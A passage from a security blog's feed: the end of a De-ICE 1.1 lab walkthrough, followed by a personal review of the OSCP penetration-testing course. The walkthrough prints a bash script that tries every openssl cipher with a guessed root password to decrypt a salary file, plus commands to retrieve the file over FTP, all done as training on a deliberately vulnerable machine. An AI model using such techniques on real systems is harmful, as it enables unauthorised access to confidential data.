<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>#!/bin/bash
</span><span class='line'>
</span><span class='line'># Usage:
</span><span class='line'>if [[ -z $1 ]]; then
</span><span class='line'>    echo 'USAGE: ./brutedecypt.sh &lt;input file&gt; &lt;output file&gt; &lt;password&gt; [cipher]'
</span><span class='line'>fi
</span><span class='line'>
</span><span class='line'># Arrange variables
</span><span class='line'>INPUTFILE=$1
</span><span class='line'>OUTPUTFILE=$2
</span><span class='line'>PASSWORD=$3
</span><span class='line'>CIPHER=$4
</span><span class='line'>
</span><span class='line'># If a specific cipher is not given then
</span><span class='line'># get list of ciphers using by openssl
</span><span class='line'>if [[ -z $CIPHER ]]; then
</span><span class='line'>    CIPHER=`openssl list-cipher-commands`
</span><span class='line'>fi
</span><span class='line'>
</span><span class='line'>#echo $CIPHER
</span><span class='line'>
</span><span class='line'># For each cipher type run the following command for each password
</span><span class='line'># (unless specific password given)
</span><span class='line'>for c in $CIPHER; do
</span><span class='line'>    openssl enc -d -${c} -in ${INPUTFILE} -k ${PASSWORD} &gt; /dev/null 2&gt;&1
</span><span class='line'>    
</span><span class='line'>    # Check to see if the command didn't fail the decryption
</span><span class='line'>    # If it didn't alert user
</span><span class='line'>    if [[ $? -eq 0 ]]; then
</span><span class='line'>        # Display commands of possible decryption methods
</span><span class='line'>        # Appends the cipher ont he end of the output file so more than one commands
</span><span class='line'>        # Can be run at the same time
</span><span class='line'>        echo "openssl enc -d -$c -in $INPUTFILE -out $OUTPUTFILE-$c -k $PASSWORD"
</span><span class='line'>        #exit 0
</span><span class='line'>    fi
</span><span class='line'>done</span></code></pre></td></tr></table></div></figure>


<p>Let&rsquo;s put this script on our machine and run it. Wait a minute! What password should we be trying to decrypt with? Well if you remember the comment next to the root user in the /etc/passwd file (see below), it seems a safe bet to assume that the root user&rsquo;s password is linked to the FTP, and since we found the file in the ftp&rsquo;s folder it might be a good starting point.</p>

<pre><code>root:x:0:0:DO NOT CHANGE PASSWORD - WILL BREAK FTP ENCRYPTION:/root:/bin/bash
</code></pre>

<p>Let&rsquo;s now copy the script onto our machine, I&rsquo;m going to do this with nano this time. nano is a simple command line text editor. I will paste the script into this file, save then quit.</p>

<pre><code>root@kali ~$ nano ./brutedecrypt.sh
</code></pre>

<p>We now want run the script, for this to happen we need to give it executable permission. the command line application chmod will do this for us, it&rsquo;s an important command to understand so I suggest reading up on it if you&rsquo;ve never used it before.</p>

<pre><code>root@kali ~$ chmod +x brutedecrypt.sh
</code></pre>

<p>Let&rsquo;s create a folder called results to store the results of the decryption in as there might be false positives to sort through.</p>

<pre><code>root@kali ~$ mkdir results
</code></pre>

<p>Now for the brute forcing. The syntax of the script is:</p>

<pre><code>./brutedecrypt.sh &lt;input file&gt; &lt;output file&gt; &lt;password&gt; [specific cipher] 
</code></pre>

<p>The file will not be outputted from running this script, but if decryption is successful then a command will be outputted which included the output location. The cipher type is added onto the end of the output files so they do not overwrite each other. If you want to try a specific cipher you can insert it at the end of the parameters if you wish. Let&rsquo;s run the command and check the output:</p>

<pre><code>root@kali ~$ ./brutedecrypt.sh salary_dec2003.csv.enc results/salary_dec2003.csv tarot                                          
openssl enc -d -aes-128-cbc -in salary_dec2003.csv.enc -out results/salary_dec2003.csv-aes-128-cbc -k tarot
openssl enc -d -base64 -in salary_dec2003.csv.enc -out results/salary_dec2003.csv-base64 -k tarot
openssl enc -d -bf-cfb -in salary_dec2003.csv.enc -out results/salary_dec2003.csv-bf-cfb -k tarot
openssl enc -d -bf-ofb -in salary_dec2003.csv.enc -out results/salary_dec2003.csv-bf-ofb -k tarot
openssl enc -d -cast5-cfb -in salary_dec2003.csv.enc -out results/salary_dec2003.csv-cast5-cfb -k tarot
openssl enc -d -cast5-ofb -in salary_dec2003.csv.enc -out results/salary_dec2003.csv-cast5-ofb -k tarot
openssl enc -d -des-cfb -in salary_dec2003.csv.enc -out results/salary_dec2003.csv-des-cfb -k tarot
openssl enc -d -des-ede-cfb -in salary_dec2003.csv.enc -out results/salary_dec2003.csv-des-ede-cfb -k tarot
openssl enc -d -des-ede-ofb -in salary_dec2003.csv.enc -out results/salary_dec2003.csv-des-ede-ofb -k tarot
openssl enc -d -des-ede3-cfb -in salary_dec2003.csv.enc -out results/salary_dec2003.csv-des-ede3-cfb -k tarot
openssl enc -d -des-ede3-ofb -in salary_dec2003.csv.enc -out results/salary_dec2003.csv-des-ede3-ofb -k tarot
openssl enc -d -des-ofb -in salary_dec2003.csv.enc -out results/salary_dec2003.csv-des-ofb -k tarot
openssl enc -d -rc2-cfb -in salary_dec2003.csv.enc -out results/salary_dec2003.csv-rc2-cfb -k tarot
openssl enc -d -rc2-ofb -in salary_dec2003.csv.enc -out results/salary_dec2003.csv-rc2-ofb -k tarot
openssl enc -d -rc4 -in salary_dec2003.csv.enc -out results/salary_dec2003.csv-rc4 -k tarot
openssl enc -d -rc4-40 -in salary_dec2003.csv.enc -out results/salary_dec2003.csv-rc4-40 -k tarot
openssl enc -d -seed-cfb -in salary_dec2003.csv.enc -out results/salary_dec2003.csv-seed-cfb -k tarot
openssl enc -d -seed-ofb -in salary_dec2003.csv.enc -out results/salary_dec2003.csv-seed-ofb -k tarot
</code></pre>

<p>Looks like there could be lots of false positives! Because we made the results folder earlier we&rsquo;re good to go and run these commands. We can simply copy and paste them into the shell and they should execute without errors. We now need to identify which is the correct decryption format. A quick bash one liner should help us quickly find out:</p>

<pre><code>root@kali ~$ cd results
root@kali ~/results$ for i in $(ls); do echo $i; grep -i salary $i; done                                                        
salary_dec2003.csv-aes-128-cbc
,Employee ID,Name,Salary,Tax Status,Federal Allowance (From W-4),State Tax (Percentage),Federal Income Tax (Percentage based on Federal Allowance),Social Security Tax (Percentage),Medicare Tax (Percentage),Total Taxes Withheld (Percentage),"Insurance
salary_dec2003.csv-base64
salary_dec2003.csv-bf-cfb
salary_dec2003.csv-bf-ofb
salary_dec2003.csv-cast5-cfb
salary_dec2003.csv-cast5-ofb
salary_dec2003.csv-des-cfb
salary_dec2003.csv-des-ede3-cfb
salary_dec2003.csv-des-ede3-ofb
salary_dec2003.csv-des-ede-cfb
salary_dec2003.csv-des-ede-ofb
salary_dec2003.csv-des-ofb
salary_dec2003.csv-rc2-cfb
salary_dec2003.csv-rc2-ofb
salary_dec2003.csv-rc4
salary_dec2003.csv-rc4-40
salary_dec2003.csv-seed-cfb
salary_dec2003.csv-seed-ofb
</code></pre>

<p>What did that one liner do?! If you&rsquo;re not into programming or scripting the following might be alien to you, but I encourage you to understand it and try some simple scripts for yourself: they&rsquo;re incredibly useful!
This one liner is a simple for loop. We create a variable to contain all the names of files using $(ls). From here we reference each file name with $i. In each iteration in the loop we echo the file name, use grep to search the file for the string salary. I chose salary as it seems most likely to appear in the file given the file being called salary_dec2003.csv. Had this not been the case I could edit the one liner and choose another search term. The output we got was from the first file using the aes-128-cbc cipher. You can now cat this file and pipe it to less which gives you a friendlier way to view it</p>

<pre><code>root@kali ~/results$ cat salary_dec2003.csv | less 
</code></pre>

<p>Well there you have it, we have rooted the machine and got some evidence to show for it. This would normally be the end but there is an additional challenge to fix the FTP server.</p>

<h3>Bonus points?!</h3>

<p>Now now, you don&rsquo;t have to do this, it&rsquo;s purely an added extra&hellip; I think? I wont go into too much depth here as I don&rsquo;t think this part will interest many people. Looking back we were unable to identify the service version running on port 21. nmap suggested that vsftpd was running but returned an error. Let&rsquo;s confirm that by searching for ftp configuration files in /etc.</p>

<pre><code>root@slax:~# find /etc -name *ftp* -type f
/etc/rc.d/rc.vsftpd
/etc/logrotate.d/vsftpd
/etc/vsftpd.conf
</code></pre>

<p>This confirms that vstfp is running, nmap was correct! Let&rsquo;s look at the find command used here more closely as it can be handy if you&rsquo;re looking for specific files.</p>

<ul>
<li>/etc &ndash; the directory we want to search in recursively</li>
<li>-name <em>ftp</em> &ndash; return everything with ftp in the name</li>
<li>-type f &ndash; only return results that are files</li>
</ul>


<p>Let&rsquo;s google the error that nmap gave us (which can also be seen when attempting an ftp connection to the target IP on port 21). After some googling we can find that this error may be given to us due to the following setting in the /etc/vsftpd.conf file:</p>

<pre><code># To run vsftpd in standalone mode (rather than through inetd), uncomment
# the line bow.
listen=YES
</code></pre>

<p>To check if vsftpd is running through inetd we can check netstat and see what service is running on port 21:</p>

<pre><code>root@slax:~# netstat -antp | grep 21
tcp        0      0 0.0.0.0:21              0.0.0.0:*               LISTEN     9511/inetd
</code></pre>

<p>There, it looks like we need to edit /etc/vsftpd.conf and change listen=YES to listen=NO. Let&rsquo;s make that change and attempt to connect to the port manually:</p>

<pre><code>root@kali ~$ ftp 192.168.1.100
Connected to 192.168.1.100.
220 (vsFTPd 2.0.4)
Name (192.168.1.100:root): root
331 Please specify the password.
Password:
230 Login successful.
</code></pre>

<p>Hooray it works! Let&rsquo;s use ls to list the files&hellip;</p>

<pre><code>ftp&gt; ls
215 UNIX Type: L8
500 OOPS: vsf_sysutil_recv_peek
ftp&gt;
</code></pre>

<p>Oh dear, somethings still not quite right! Back to google! It seems that a module needs to be added to the kernel to allow the vsftpd to function correctly. Let&rsquo;s load this module and try and connect again from our machine.</p>

<pre><code>root@slax:~# modprobe capability
root@kali ~/deice10010/results$ ftp 192.168.1.100                                                                                          
Connected to 192.168.1.100.
220 (vsFTPd 2.0.4)
Name (192.168.1.100:root): root
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&gt; ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwx---r-x    2 0        0              63 Jul 20  2006 Desktop
-rw-r--r--    1 0        0             323 May 02  2005 Set IP address
226 Directory send OK.
ftp&gt; cd /home/ftp/incoming
250 Directory successfully changed.
ftp&gt; ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-r-xr-xr-x    1 0        0          133056 Jun 29  2007 salary_dec2003.csv.enc
226 Directory send OK.
ftp&gt; get salary_dec2003.csv.enc
local: salary_dec2003.csv.enc remote: salary_dec2003.csv.enc
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for salary_dec2003.csv.enc (133056 bytes).
226 File send OK.
133056 bytes received in 0.00 secs (46011.9 kB/s)
</code></pre>

<p>After connecting we were able to get a directory listing, change directory to the known ftp location and download the encrypted salary file!</p>

<h3>Conclusion</h3>

<p>You should now have a good grasp on how to tackle a vulnerable machine. Of course there are many other virtual machines out there that differ to this one, and new types of attacks will have to be learned to overcome their specific obstacles. The most important thing to take away from this machine is the gathering of information. A simple list of users enabled us to get into the whole system! Don&rsquo;t take shortcuts. Remember to do your information gathering as much as possible in the beginning otherwise you may find yourself going through it all over again! What&rsquo;s important to mention here is that we didn&rsquo;t have to do much with the information we could out about the services. However in other challenges this information will be vital to make a successful breach.</p>

<h3>Thanks</h3>

<p>Thanks for reading! If you reached this far, well done, it is a very long post and I don&rsquo;t intend to do this for every vulnerable machine I write about. I hope those that read this managed to grips with the basic ideas and tools that are used in the penetration testing world.</p>

<h3>Shout-outs</h3>

<p>Thanks to superkojiman for giving me a starting point for the decryption script!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Penetration Testing With Backtrack - OSCP]]></title>
    <link href="http://blog.nullmode.com/blog/2013/05/11/penetration-testing-with-backtrack-oscp/"/>
    <updated>2013-05-11T12:00:00+01:00</updated>
    <id>http://blog.nullmode.com/blog/2013/05/11/penetration-testing-with-backtrack-oscp</id>
    <content type="html"><![CDATA[<p>The Penetration Testing with BackTrack (PWB) course is one which covers a lot of topics and genres, will push you to your limits, and make you forget what sleep is. The remote lab covers multiple networks, each with machines varying in difficulty and types of vulnerabilities. I cannot go into too much detail due to the non-disclosure agreement students make with Offensive Security. The best insight as to what is covered in the course can be viewed here in the <a href="http://www.offensive-security.com/documentation/penetration-testing-with-backtrack.pdf">course syllabus</a> (this is what got me initially interested in the course). Be aware that the lab book will go through a large selection of topics, but independent research will be required. Expect to be surprised in the labs.</p>

<!-- more -->


<p>To start with a few quick notes to people that might be reading this.</p>

<h3>Le background</h3>

<p>Before I start rambling on about my experiences and information about the course, it is worth noting my past experience. Before taking the course my main programming strengths were PHP and Java (guys don&rsquo;t shoot me). I had some basic web app exploitation knowledge and a some Linux experience.</p>

<p>I was advised to tackle some free systems that have built-in vulnerabilities (listed at the bottom of this post). All of these applications were Linux based, they were fun to do and gave me deeper insight into service enumeration, web-based attacks and kernel exploitation. I am glad I decided to do these boxes as it gave me a bit of a starting knowledge. However, if you are new to this game as I was (and still am) the offsec course will throw a hell of a lot more at you than these machines will.</p>

<p><strong>If you&rsquo;re new penetration testing</strong> and have similar experience to me then this course may not be for you. I encourage you to read this post as I will attempt to put things into perspective about the time it takes, and the factors that helped me succeed in the time I did. Believe me when I say that if you&rsquo;re new, it&rsquo;s gonna hurt, it&rsquo;s going to take time but it&rsquo;s gonna be fun.</p>

<p><strong>If you&rsquo;re not new to penetration testing</strong> this course may be great as a &ldquo;refresher&rdquo; or something to do to get some additional practice. It may even be a case of doing it to get the cert for your resume. If you&rsquo;re a fully-fledged pen tester you will probably (and hopefully) fly through the course.</p>

<h3>Many thanks</h3>

<p>I am very lucky to have and made a few good friends that have guided me and supported me throughout this course. Without them, I would not have learnt and grasped as much, and would certainly have not popped as many machines as I did. If you&rsquo;re one of the people that helped me in this course (and you will know who you are) thank you for teaching me how to fish.</p>

<h3>The adventure</h3>

<p>I booked the 60 day option for the course, knowing that I would at least need this amount of time to get to grips with the materiel and make a good start on the labs. I made a point of downloading and looking at the course syllabus to see what I was letting myself in for. Well, to me it looked fun. The course covered a wide range of topics which tickled my fancy.</p>

<p>I took 2 weeks off my job at the time to work through all of the material. I took notes, screenshotted everything and completed near enough all of the exercises. For me, this is the only way for stuff to sink in (plus I wanted to get my money&rsquo;s worth). I had half hoped I could get through the PDFs and videos quickly, however I found that even after my 2 weeks off work I still had some stuff to do. I put this down to my overly-keen documentation, but I don&rsquo;t regret this at all. I now have a massive KeepNote file I can reference in the future.</p>

<p>I moved into the lab environment and quickly got to grips with a few of the tools described in the lab book. I started off by looking for the &ldquo;Low Hanging Fruit&rdquo;. See port X open, exploit with Y. I soon broke into a few machines using some of the basic exploits and vulnerabilities described in the material. After about a week I had a small collection of machines under my belt, and a lot of information collected.</p>

<p>It was at this point I felt I was tackling the course the wrong way. I started brute forcing my way into servers. I&rsquo;m not going to let on exactly what I was doing because I don&rsquo;t want to ruin the course for others. Long story short: I ended up taking &ldquo;the easy route&rdquo;. After chatting with a friend I could sense he was either face palming or shaking his head. After a small discussion I took it upon myself to break into the remaining machines (and the ones I had brute forced) through their intended vulnerabilities.</p>

<p>Now I know for a fact that in an actual penetration test, some of the techniques I used to pop boxes so quickly are vital (as time is usually of the essence). However, I did not want to go down this route as, for me at least,  more knowledge was to be gained by breaking into machine the hard way. After I cleared my conscience I started popping through boxes again, I found that I was getting a lot more satisfaction and &ldquo;awwww yeah!&rdquo; moments when getting system/root on servers.</p>

<p>I extended the course by another 30 days so I could attempt to break into all the boxes. I really started picking up the pace at this point. I was popping at least a machine a day. The course material had finally sunk in better after some initial exposure to the labs; things were falling into place where they hadn&rsquo;t before. I started to find myself thinking more logically about the problems I was facing with a tough box, thinking back to basics, and finding out stuff I had missed. I popped the majority of the machines when my lab time ran out. I also took the time to break into everything again, save commands used, their outputs and save the screen shots. I did this more for myself so I had something to look back on after the course. It took me a good couple of days to do this, but I don&rsquo;t regret this at all.</p>

<h3>Exam</h3>

<p>I booked my exam around about a month after my lab time had finished. I relished the time to relax a bit and not have to spend endless hours on the course. Looking back, I think that a month was too long to wait for the exam. I would say two weeks would have sufficed, giving me time to finish writing the lab report and preparing for the exam. In fact, I think the exam would have gone a bit easier as the course material would have been fresh in my head.</p>

<p>The exam lasts for 24 hours, I decided to opt for a afternoon start and prepared myself with a bit of a lay in. It was probably one of the most intense 24 hours of my life but it was certainly worth it. Within 72 hours of submitting my lab and exam reports I got this in my mail box:</p>

<p><strong>We are happy to inform you that you have successfully completed your Certification Challenge and obtained your OSCP certification.</strong></p>

<h3>Summary</h3>

<p>Overall I really enjoyed the course. From starting with quite a small amount of knowledge I managed to gain a great understanding of the basics. Being thrown in the deep end is a great tool for learning, it makes you look up things that may not work, but at least you learn why it doesn&rsquo;t work and gain additional knowledge from doing so. New or Professional, there is something in this course for everyone. Learn the basics, hone your skills, or get a certification for your resume.</p>

<p>Help and guidance
The <a href="irc://irc.freenode.net/offsec" title="#offsec">#offsec</a> IRC channel on freenode is always active, and there should always be an admin around. You can get some &ldquo;hints&rdquo; with a specific machine you can !machinename in their IRC channel (some troll messages too). The forums are also a treasure trove of past posts that can be helpful if you&rsquo;re stuck or if you&rsquo;re having a problem with a particular box or lab module.</p>

<p>Course advice
If you get stuck on a box try to think back to basics. Enumeration is the key! Look back on the techniques you learnt from the material to finger print, banner grab and enumerate services/web applications. Google is your friend! Try to solve things yourself before asking others, especially when the question is one you find the answer for in a 10 second google search. Finding the solution yourself will also give you a better feeling then if you&rsquo;re just given the answers. Remember, in the real world, if you&rsquo;re stuck trying to break into a machine whilst on a pen test, who is going to spoon feed you then? Don&rsquo;t be too scared/lazy to read things! Try and do things the hard way if possible, the feeling you get will be great, and the amount of knowledge to be gained is worth it&rsquo;s weight in gold.</p>

<p>Before taking the course
Check out VulnHub (linked below) or similar sites to get a feel for what the course is going to offer. The machines I played with before starting the course:</p>

<ul>
<li>Kioptrix Level 1</li>
<li>Kioptrix Level2</li>
<li>De-Ice Disk 1</li>
<li>De-Ice Disk 1.1</li>
<li>De-Ice Disk 2.1</li>
<li>DVWA (Damn Vulnerable Web App)</li>
</ul>


<p>I would also suggest the following machines:</p>

<ul>
<li>Metasploitable</li>
<li>Metasploitable 2</li>
</ul>


<p>There are plenty of other free resources on the web, to list a few:</p>

<ul>
<li><a href="http://www.hackthissite.org">http://www.hackthissite.org</a></li>
<li><a href="https://www.corelan.be">https://www.corelan.be</a></li>
<li><a href="https://www.hacking-lab.com">https://www.hacking-lab.com</a></li>
</ul>


<h3>Links</h3>

<ul>
<li><a href="http://vulnhub.com">http://vulnhub.com</a></li>
<li><a href="http://www.offensive-security.com/information-security-training/penetration-testing-with-backtrack">http://www.offensive-security.com/information-security-training/penetration-testing-with-backtrack</a></li>
<li><a href="http://www.offensive-security.com/documentation/penetration-testing-with-backtrack.pdf">http://www.offensive-security.com/documentation/penetration-testing-with-backtrack.pdf</a></li>
</ul>

]]></content>
  </entry>
  
</feed>
